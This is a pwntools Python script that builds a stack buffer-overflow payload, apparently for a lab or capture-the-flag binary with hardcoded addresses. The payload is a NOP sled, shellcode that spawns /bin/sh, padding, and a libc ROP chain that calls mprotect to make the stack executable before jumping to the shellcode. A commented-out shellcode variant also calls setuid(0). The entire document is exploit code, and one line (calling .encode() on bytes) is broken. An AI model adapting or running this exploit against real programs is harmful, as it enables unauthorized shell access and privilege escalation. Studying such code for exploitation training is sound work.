from pwn import *
from pwn import p64
from pwn import shellcraft

nop_sleds = b"\x90" * 50
libc_base_address = 0x00007FFFF7C00000
rdi_addr = libc_base_address + 0x10F75B
# rsi_addr = libc_base_address + 0x110A4D
rsi_addr = libc_base_address + 0x2B46B
rdx_addr = libc_base_address + 0x66B9A
mrpotect_addr = libc_base_address + 0x125C10
stack_addr = 0x00007FFFFFFFD000
shellcode_addr = 0x00007FFFFFFFD840
ret_addr = 0x0000555555554000 + 0x101A

# shellcode = b"\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05"
shellcode = asm(shellcraft.amd64.linux.sh())
print(shellcode)
junk = b"A" * (208 - len(nop_sleds) - len(shellcode))

payload = nop_sleds
payload += shellcode.encode()
payload += junk
payload += b"B" * 8
payload += p64(rdi_addr)
payload += p64(stack_addr)
payload += p64(rsi_addr)
payload += p64(0x1000)
payload += p64(0x1)
payload += p64(rdx_addr)
payload += p64(0x7)
payload += p64(mrpotect_addr)
payload += b"A" * 25
payload += p64(shellcode_addr)

with open("payload", "wb") as f:
    f.write(payload)
